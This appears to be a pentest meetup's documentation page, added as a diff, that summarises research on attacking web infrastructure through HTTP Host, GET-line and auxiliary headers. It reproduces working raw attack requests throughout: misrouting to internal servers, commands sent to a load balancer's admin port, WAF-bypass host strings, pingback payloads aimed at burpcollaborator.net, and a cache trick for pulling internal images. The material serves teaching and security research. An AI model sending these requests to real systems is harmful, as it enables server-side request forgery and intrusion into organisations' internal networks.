@@ -1,0 +1,463 @@
+.. include:: /pentest_links.txt
+
+
+*************************************
+2017-08-05 Attacking via HTTP Headers
+*************************************
+
+This presentation is based on `Cracking the Lens: Targeting HTTP's Hidden Attack-Surface <http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html>`_ from the blog of the `Burp Suite`_ tool.
+
+You should assume that any quotes in this article are from the original presentation. Nothing here is original to the meetup group. We might emphasize (make bold) text to aid skimming through or presenting the material.
+
+
+Modifying HTTP header fields
+============================
+
+For an intro to HTTP header fields see :ref:`http-headers`. In this section the two most-discussed attacks focus on "Host:" header and the "GET" request itself.
+
+Host: header
+------------
+
+The HTTP "Host:" header field can be attacked by putting in a host not intended to be the HTTP destination server, or by adding unexpected characters that exploit parsing errors.
+
+Improper host
+^^^^^^^^^^^^^
+
+The "Host:" header is supposed to be the target host name and optionally port given by the user as shown here:
+
+.. code-block:: console
+
+  hacker@meetup:~$ curl -v http://www.example.com/index.html  2>&1 |  egrep  '^> (GET |Host:)'
+  > GET /index.html HTTP/1.1
+  > Host: www.example.com
+
+The request "http://www.example.com/index.html" was split into "GET /index.html HTTP/1.1" and "Host: www.example.com".
+
+But what if "Host:" were manipulated to an unexpected host and a reverse proxy did not properly whitelist the "Host:" header field? Then the request could go to either an internal server possibly not intended to receive Internet traffic, or provide a "pingback" to an external host providing information to further attack an internal host.
+
+Here's an example where the "Host:" header field is followed:
+
+.. code-block:: bash
+  :emphasize-lines: 2,4
+
+  (
+  exec 9<>/dev/tcp/ktla.com/80  # open tcp port 80 to/from ktla.com
+  # Make a web request
+  echo -ne "GET / HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n" >&9
+  # Get the response
+  cat <&9
+  )
+
+Here's an example with the hosts in the previous example switched, where the "Host:" header field is properly screened and results in an HTTP 404 "Not Found" error:
+
+.. code-block:: bash
+  :emphasize-lines: 2,4
+
+  (
+  exec 9<>/dev/tcp/www.example.com/80  # open tcp port 80 to/from www.example.com
+  # Make a web request
+  echo -ne "GET / HTTP/1.1\r\nHost: ktla.com\r\nConnection: close\r\n\r\n" >&9
+  # Get the response
+  cat <&9
+  )
+
+Note that name-based virtual hosting depends on the HTTP "Host:" header field to differentiate the target web servers. The legal values would depend on the current set of virtual hosts sharing the IP, and that set can change frequently.
+
+Unexpected characters
+^^^^^^^^^^^^^^^^^^^^^
+
+Additionally, consider if extra characters were added to "Host:", like "@"? In one of the exploits "@" was treated as a separator between a userid and password.
+
+
+GET request
+-----------
+
+Similarly, what if the GET request were modified to provide a FQDN as opposed to a relative reference "/..."? The results could be similar to an attack using the "Host:" header:
+
+.. code-block:: bash
+  :emphasize-lines: 2,4
+
+  (
+  exec 9<>/dev/tcp/ktla.com/80  # open tcp port 80 to/from ktla.com
+  # Make a web request
+  echo -ne "GET http://www.example.com/index.html HTTP/1.1\r\nHost: ktla.com\r\nConnection: close\r\n\r\n" >&9
+  # Get the response
+  cat <&9
+  )
+
+Here's an example with the hosts in the previous example switched, where the "GET" request is properly screened and results in an HTTP 400 "Bad Request" error:
+
+.. code-block:: bash
+  :emphasize-lines: 2,4
+
+  (
+  exec 9<>/dev/tcp/www.example.com/80  # open tcp port 80 to/from www.example.com
+  # Make a web request
+  echo -ne "GET http://ktla.com/index.html HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n" >&9
+  # Get the response
+  cat <&9
+  )
+
+
+Making invisible systems contact us
+===================================
+
+
+Getting access to hidden servers
+--------------------------------
+
+HTTP headers can be used to unmask hidden, non-public servers. The idea is that if the "Host:" HTTP headers is set to someplace.else.com instead of expected.server.com, then the request may be sent to someplace.else.com and it may actually respond. That response is called a "pingback" and can be the start of an exploit.
+
+
+Tools
+-----
+
+Burp Collaborator, Canarytokens
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Invisible systems like load balancers can be unmasked with carefully crafted payloads resulting in a "pingback": network traffic (DNS, HTTP) to our servers.
+
+To determine when such contact occurs the author used their product `Burp Collaborator <https://portswigger.net/burp/help/collaborator.html>`_, but also pointed out the open source `Canarytokens <https://canarytokens.org/generate>`_.
+
+See `Canarytokens.org - Quick, Free, Detection for the Masses <http://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html>`_ for a description of Canarytokens.
+
+For a basic introduction to the problem of detecting pingbacks see `Introducing Burp Collaborator <http://blog.portswigger.net/2015/04/introducing-burp-collaborator.html>`_. Basically, Burp Collaborator runs a server with DNS that can detect external DNS & web requests from a target.
+
+
+Collaborator Everywhere
+^^^^^^^^^^^^^^^^^^^^^^^
+
+The author also wrote the Burp extension `Collaborator Everywhere <https://github.com/PortSwigger/collaborator-everywhere>`_ to inject "payloads containing unique identifiers into all proxied traffic, and uses these to automatically correlate pingbacks with the corresponding attacks." An example of it's usage is Netflix "visited the URL specified in the Referer header four hours after my visit to their site, and is pretending to be an iPhone running on an x86 CPU".
+
+ZMap/ZGrab
+^^^^^^^^^^
+
+The author initially used `Masscan <https://github.com/robertdavidgraham/masscan>`_ but switched to `Zmap/Zgrab <https://github.com/zmap/zgrab>`_.
+
+
+Burp Suite, mitmproxy, Ncat/OpenSSL
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Besides Burp Suite, the author recommended `mitmproxy <https://mitmproxy.org/>`_ and Ncat/OpenSSL. ``socat`` can also be used in lieu of Ncat/OpenSSL.
+
+
+Target sites
+------------
+
+In order to be legal "Target domains and IP addresses were obtained by manually building a list of legally testable domains from public and private bug bounty programs, and mapping this against `Rapid7's Project Sonar Forward DNS database <https://scans.io/study/sonar.fdns_v2>`_". That led to 50k potential web server targets. "To maximize coverage I used up to five hostnames per IP, used both HTTP and HTTPS, and also tried to trigger edge cases using X-Forwarded-Proto: HTTPS and Max-Forwards. I also sent the Cache-Control: no-transform header to discourage intermediate servers from mangling my payloads".
+
+
+Misrouting requests
+===================
+
+The examples below assume you are using Burp Collaborator and therefore the external website burpcollaborator.net.
+
+Invalid HTTP Host Header
+------------------------
+
+The first exploit uses an incorrect HTTP Host header and was used to "exploit 27 DoD servers, my ISP, a Columbian ISP that threw itself in the firing line using DNS poisoning, and http://ats-vm.lorax.bf1.yahoo.com/ ".
+
+Here is the attack against http://ats-vm.lorax.bf1.yahoo.com/ (replacing the original "GET" with "HELP")
+
+.. code-block:: text
+  :emphasize-lines: 1-2,12,14-16
+
+  HELP / HTTP/1.1
+  Host: XX.X.XXX.XX:8082
+
+
+  HTTP/1.1 200 Connection Established
+  Date: Tue, 07 Feb 2017 16:33:59 GMT
+  Transfer-Encoding: chunked
+  Connection: keep-alive
+
+  Ok
+
+    Traffic Server Overseer Port
+
+    commands:
+      get <variable-list>
+      set <variable-name> = "<value>"
+      help
+      exit
+
+    example:
+
+      Ok
+      get proxy.node.cache.contents.bytes_free
+      proxy.node.cache.contents.bytes_free = "56616048"
+      Ok
+
+    Variable lists are conf/yts/stats records, separated by commas
+
+  Ok
+  Unknown Command
+  Ok
+  Unknown Command
+  Ok
+  Unknown Command
+  Ok
+
+The line "Traffic Server Overseer Port" tells us that this is `Apache Traffic Server <https://github.com/pquerna/trafficserver>`_ with documentation at `Apache Traffic Server Manual <https://docs.trafficserver.apache.org/en/latest/index.html>`_. The extra "Unknown Command" lines are probably due to the Apache Traffic Server using "\\n' line endings.
+
+The exploit consisted of sending Apache Traffic Server configuration commands, starting with setting `proxy.config.alarm_email <https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html?highlight=alarm_email#alarm-configuration>`_ (demonstrating that "Using the SET command, I could have made wide-ranging configuration changes to Yahoo's pool of load balancers, including enabling SOCKS proxying and granting my IP address permission to directly push items into their cache."):
+
+.. code-block:: http
+  :emphasize-lines: 1-2,5,18
+
+  GET / HTTP/1.1
+  Host: XX.X.XXX.XX:8082
+  Content-Length: 34
+
+  GET proxy.config.alarm_email
+
+
+  HTTP/1.1 200 Connection Established
+  Date: Tue, 07 Feb 2017 16:57:02 GMT
+  Transfer-Encoding: chunked
+  Connection: keep-alive
+
+  Ok
+  / HTTP/1.1 is unavailable
+  Ok
+  Unknown Command
+  Ok
+  proxy.config.alarm_email = "nobody@yahoo-inc.com"
+
+
+Uncovering monitoring (why HTTPS is important)
+----------------------------------------------
+
+
+British Telecom spying
+^^^^^^^^^^^^^^^^^^^^^^
+
+The author discovered that ISPs (presumably with government sponsorship) are intercepting HTTP (but not HTTPS) by DNS redirection. cloud.mail.ru was in that list. From the original article:
+
+  To discern the system's true purpose, I used Masscan to ping TCP port 80 across the entire IPv4 address space using a TTL of 10 - effectively a whole internet traceroute. After filtering out caches and self-hosted websites, I had a complete list of targeted IP addresses. Sampling this list revealed that the system was primarily being used to block access to copyrighted content. Traffic to blacklisted IP addresses was being rerouted into the pool of proxies so that they could inspect the HTTP host header being used, and potentially block the request with a message I'm sure none of our upstanding UK readership is familiar with:
+
+.. code-block:: http
+  :emphasize-lines: 2,5,6
+
+  GET / HTTP/1.1
+  Host: www.icefilms.info
+
+  HTTP/1.1 200 OK
+  ...
+  <p>Access to the websites listed on this page has been blocked pursuant to orders of the high court.</p>
+
+Continuing on in the article:
+
+  This setup has several notable consequences. Thanks to virtual hosting, cloud hosts like Google Sites have ended up on the blacklist, meaning all traffic to them from consumer and corporate BT users is proxied. From a blacklisted server's point of view, all BT users share the same tiny pool of IP addresses. This has resulted in BT's proxy's IPs landing on abuse blacklists and being banned from a number of websites, affecting all BT users. Also, if I had used the aforementioned admin access vulnerability to compromise the proxy's administration panels, I could could potentially reconfigure the proxies to inject content into the traffic of millions of BT customers. Finally, this highlights just how easily overlooked such vulnerabilities are; for years I and many other British pentesters have been hacking through an exploitable proxy without even noticing it existed.
+
+  I reported the ability to access the internal admin panel to a personal contact at BT, who ensured it was quickly resolved. They also shared that the interception system was originally constructed as part of CleanFeed, a government initiative to block access to images of child abuse. However, it was inevitably repurposed to target copyright abuse.
+
+
+Columbia's METROTEL spying
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+From the original article:
+
+  Rapid7's Project Sonar had used a public METROTEL DNS server which was selectively poisoning results for certain domains in order to redirect traffic into its proxy for DPI. To pass through HTTPS traffic without causing certificate errors they sniffed the intended remote host from the Server-Name Indicator (SNI) field. I notified Rapid7 who identified the misbehaving DNS server, meaning I could feed the Alexa top 1 million domain list into it and identify targeted hosts. It appeared to be targeting various image and video hosts, and also some lesser known social networks. Attempting to visit these resulted in a redirect to http://internetsano.metrotel.net.co/, stating that the site was blocked for containing images of child abuse.
+
+  As with BT, the original intention of this system may be commendable but there was evidence it had been repurposed. In addition to targeting image hosting sites, the DNS server also poisoned lookups to certain news websites including bbc.co.uk. This is presumably to block or tamper with certain news articles, though I haven't yet identified which articles are being targeted.
+
+
+Input permutation
+-----------------
+
+For some hosts an HTTP request like:
+
+.. code-block:: http
+  :emphasize-lines: 2
+
+  GET / HTTP/1.1
+  Host: burpcollaborator.net
+  Connection: close
+
+Would generate the following request:
+
+.. code-block:: http
+  :emphasize-lines: 2
+
+  GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1
+  Host: outage.burpcollaborator.net
+  Via: o2-b.ycpi.tp2.yahoo.net
+
+This invites creating a DNS record for "outage.yourdomain.com" mapping to an internal address in someone else's infrastructure. But in the following case that wasn't necessary, as the whole domain vcap.me (including ``dig +short outage.vcap.me``) resolves to 127.0.0.1:
+
+.. code-block:: http
+  :emphasize-lines: 2
+
+  GET / HTTP/1.1
+  Host: ./?x=.vcap.me
+  Connection: close
+
+will lead to:
+
+.. code-block:: text
+  :emphasize-lines: 2
+
+  GET /vcap.me/../?=x=.vcap.me
+  Host: outage.vcap.me
+  Via: o2-b.ycpi.tp2.yahoo.net
+
+This references the internal machine via "http://127.0.0.1/" and earned the article's author a bug bounty.
+
+
+Host Overriding
+---------------
+
+Some servers restrict overriding the "Host:" header but fail to check the "GET" command, so the following did work on some US DoD servers:
+
+.. code-block:: http
+  :emphasize-lines: 1
+
+  GET http://internal-website.mil/ HTTP/1.1
+  Host: xxxxxxx.mil
+  Connection: close
+
+
+Ambiguous requests
+------------------
+
+Incapsula's cloud-based Web Application Firewall incorrectly parsed the "Host:" header ``Host: incapsula-client.net:80@burp-collaborator.net`` by authenticating to the burp-collaborator.net with username 'incapsula-client.net' and password '80'. "It revealed the location of the backend server, enabling me to bypass Incapsula's protection by accessing the backend directly."
+
+.. code-block:: http
+  :emphasize-lines: 1
+
+  GET / HTTP/1.1
+  Host: incapsula-client.net:80@burp-collaborator.net
+  Connection: close
+
+
+Breaking expectations
+---------------------
+
+The following request:
+
+.. code-block:: http
+  :emphasize-lines: 1
+
+  GET @burp-collaborator.net/ HTTP/1.1
+  Host: newrelic.com
+  Connection: close
+
+was changed to "http://public-backend@burp-collaborator.net/" and sent to burp-collaborator.net. "As usual, this vulnerability gave me access to a huge amount of internal stuff, including both unauthenticated admin panels and mystifying in-jokes."
+
+
+Tunnels (Tor2web)
+-----------------
+
+`GlobaLeaks <https://www.globaleaks.org/>`_ is a whistleblowing site that uses `Tor2web <https://tor2web.org/>`_:
+
+  **WARNING:** Tor2web only protects publishers, *not readers*. As a reader `installing Tor Browser <https://www.torproject.org/projects/torbrowser.html.en>`_ will give you much greater anonymity, confidentiality, and authentication than using Tor2web. Using Tor2web trades off security for convenience and usability.
+
+.. note::
+
+  There's another site `GlobalLeaks News <http://globalleaks.com/>`_ which automatically redirects to an HTTP web forum. A leaking platform using HTTP??? There is a `Memberlist <http://globalleaks.com/memberlist.php>`_ which returns a 404 Not Found error. A leaking platform having a members list??? And of course the `Search <http://globalleaks.com/memberlist.php>`_ and `FAQ <http://globalleaks.com/misc.php?action=help>`_ links both return a 404 Not Found error. There are associated YouTube, Facebook, and Twitter accounts. Who runs this website and for what purpose? Is it intended to be confused with GlobaLeaks?
+
+From `Wikipedia Tor2web <https://en.wikipedia.org/wiki/Tor2web>`_:
+
+  **Tor2web** is a software project to allow `Tor hidden services <https://en.wikipedia.org/wiki/List_of_Tor_hidden_services>`_ to be accessed from a standard browser without being connected to the Tor network.
+
+Rather than globaleaks.org being attacked directly via accessing internal services, it could be used as an attack platform. Using this request:
+
+.. code-block:: http
+  :emphasize-lines: 1
+
+  GET xyz.burpcollaborator.net:80/bar HTTP/1.1
+  Host: demo.globaleaks.org
+  Connection: close
+
+led to a flood of DNS requests:
+
+.. code-block:: text
+
+  xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
+  Xyz.burPColLABorAToR.nET.    from 62.210.18.16 
+  xYz.burpColLaBorATOR.net.    from 91.224.149.254
+
+"Tor exit nodes use an obscure security mechanism to increase the security of DNS by randomizing the case of requests, and this mechanism was resulting in the Burp Collaborator server refusing to reply and thus triggering a flood of lookup attempts."
+
+"As all requests are routed through Tor, it can't be abused to access any internal services.   That said, it's an exceptionally powerful way to mask an attack on a third party, particular as since GlobaLeaks is a whistleblowing platform it probably doesn't keep any logs and may end up being blamed for attacks. Additionally, the ability to make the webserver connect to a hostile site over Tor exposes a significant amount of attack surface."
+
+
+Targeting auxiliary systems
+===========================
+
+
+Getting info through other headers
+----------------------------------
+
+Collaborator Everywhere makes requests like the following to induce pingbacks:
+
+.. code-block:: http
+  :emphasize-lines: 3-6
+
+  GET / HTTP/1.1
+  Host: store.starbucks.ca
+  X-Forwarded-For: a.burpcollaborator.net
+  True-Client-IP: b.burpcollaborator.net
+  Referer: http://c.burpcollaborator.net/
+  X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
+  Connection: close
+
+"X-Forwarded-For" can induce DNS lookups "but unless you have a convenient DNS library memory corruption vulnerability the callback behavior itself isn't exploitable".
+
+"Referer" can result in not only a pingback but a complete crawl of the refering site. "This is effectively a blind SSRF vulnerability as there's no way for the user to view the results of the analytics system's request, and it often occurs minutes or hours after the user request, which further complicates exploitation."
+
+"X-Wap-Profile":
+
+  "Compliant applications will extract the URL from this header, then fetch and parse the specified XML document so they can tailor the content they supply to the client. This combination of two high risk pieces of functionality - fetching untrusted URLs and parsing untrusted XML - with obscure and easily-missed functionality seems ripe for exploitation. Unfortunately it's not widely supported - Facebook was the only bug bounty site I could find that uses it, and they appear to be doing their XML parsing with due caution. They also only fetch the specified XML document roughly 26 hours after the request, making comprehensive iterative testing intensely impractical."
+
+
+Remote Client Exploits
+----------------------
+
+The article mentioned attackes against the pingback servers that did far more than download pages. The tool `Rendering Engine Hackability Probe <http://portswigger-labs.net/hackability/>`_ (code found at `PortSwigger/hackability <https://github.com/PortSwigger/hackability>`_) which "performs a variety of tests to discover what the unknown rendering engine supports". "As well as identifying common mishaps in custom browsers (like neglecting to enforce the Same Origin Policy) it flags unusual JavaScript properties."
+
+This could provide information for further exploits.
+
+
+Pre-emptive Caching
+-------------------
+
+The original author found a military server that cached some data in the request:
+
+.. code-block:: http
+
+  GET / HTTP/1.1
+  Host: burpcollaborator.net
+
+A few seconds later the burpcollaborator.net host received these requests (apparently attempting to cache some values from an internal host):
+
+.. code-block:: text
+
+  GET /jquery.js HTTP/1.1
+  GET /abrams.jpg HTTP/1.1
+
+So to steal some internal-only images:
+
+.. code-block:: http
+  :emphasize-lines: 1,5
+
+  POST /xss.cgi HTTP/1.1
+  Content-Length: 103
+  Connection: close
+
+  xss=<img src="http://internal-server.mil/index.php/a.jpg"/>
+
+The caching server would issue these caching requests:
+
+.. code-block:: http
+
+  GET /index.php/a.jpg HTTP/1.1
+
+And the cached image could be retrieved via:
+
+.. code-block:: http
+
+  GET /index.php/a.jpg HTTP/1.1
+  Host: internal-server.mil
+
